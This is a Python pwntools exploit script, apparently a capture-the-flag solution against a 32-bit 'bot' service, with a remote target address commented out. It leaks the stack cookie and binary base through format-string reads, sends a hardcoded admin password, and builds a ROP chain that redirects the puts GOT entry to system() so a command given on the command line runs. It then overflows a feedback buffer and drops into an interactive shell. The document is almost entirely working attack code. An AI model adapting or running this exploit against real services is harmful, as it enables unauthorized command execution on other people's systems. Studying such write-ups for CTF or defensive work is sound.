from pwn import *

if 0:
    r = remote("52.30.206.11", 31337)
    elf = ELF("./libc.so")
else:
    r = process(["./bot", "0"])
    elf = ELF("/lib/i386-linux-gnu/libc.so.6")

ELF_SYSTEM = elf.symbols["system"]
ELF_PUTS = elf.symbols["puts"]

first = listen(8888)
second = listen(9999)
IP = "127.0.0.1"

def sendx(s):
    r.sendline(s)
    sleep(0.1)

def send1(s):
    first.sendline(s)
    sleep(0.1)

def send2(s):
    second.sendline(s)
    sleep(0.1)

sendx("%15$x") # Cookie
r.recvuntil("Your attempt was: ")
cookie = int(r.recvline(), 16)
sendx("%19$x") # Ret
r.recvuntil("Your attempt was: ")
base = int(r.recvline(), 16) - 0x1403
print "Cookie", hex(cookie), "ret", hex(base + 0x1403), "base", hex(base)

sendx("%6$n") # Trial
sendx(">@!ADMIN!@<") # Pass
sendx("2")
sendx(IP)
sendx("8888")
sendx("2")
sendx(IP)
sendx("9999")

send1("3")
send1("11") # Short fedback

send2("3")
send2("9999") # Long feedback

send1("derp")
send1("y")

def make_rop(n):
    return n + base

EXIT = make_rop(0x8e8)
FEED = make_rop(0xe10)
GOT = make_rop(0x4f64)
XCHG = make_rop(0x00002fbd) # xchg ebp, eax ; ret
ADD = make_rop(0x00001603) # add byte ptr [ebx + 0x75ff0cec], al ; or al, 0x89 ; ret
ADD_CONST = 0x75ff0cec
EBP = make_rop(0x00000f59) # pop ebp ; ret
EBX = make_rop(0x00000875) # pop ebx ; ret
PUTS = make_rop(0xc54) # puts(eax)
EAXEBX = make_rop(0x00003027) # add eax, dword ptr [ebx + 0x1400304] ; ret
EAX_EBX_CONST = 0x1400304
ADD_EBP_EAX = make_rop(0x00003096) # add ebp, eax ; ret




SAFE = make_rop(0x52ac)


rop = ""

def add_rop(n):
    global rop
    rop += struct.pack("<I", (n + 2**32) % 2**32)

def set_eax(what):
    add_rop(EBP)
    add_rop(what)
    add_rop(XCHG)

def aww(where, what):
    add_rop(EBX)
    add_rop(where - ADD_CONST)
    if what is not None:
        set_eax(what)
    add_rop(ADD)


for i, c in enumerate(sys.argv[1]):
    aww(SAFE+4+i, ord(c))

if 1:
    delta = ELF_SYSTEM - ELF_PUTS + 2**32
    delta &= 0xffFFff
    ss = struct.pack("<I", delta)
    for i, c in enumerate(ss):
        print("Add", i, c.encode("hex"))
        set_eax(0)
        add_rop(EBX)
        add_rop(GOT + 0x4f98 - 0x4f64 - EAX_EBX_CONST + i)
        add_rop(EAXEBX)

        add_rop(EBP)
        add_rop(ord(c))
        add_rop(ADD_EBP_EAX)
        add_rop(XCHG)
        # Now eax has system

        aww(SAFE + i, None)
        # Now SAFE has system



    add_rop(EBX)
    add_rop(SAFE - 0x34)
else:
    add_rop(EBX)
    add_rop(GOT)

#pid = pidof(r)[0]
#print(open("/proc/%d/maps" % pid).read())

set_eax(SAFE + 4)
add_rop(PUTS) # Call [ebx + 0x34]

print(hex(ELF_SYSTEM))
print(hex(ELF_PUTS))


send1("a" * 0x34 + struct.pack("<I", cookie) + "a" * 0 + struct.pack("<I", GOT) + "a" * 8 + rop)

r.interactive()



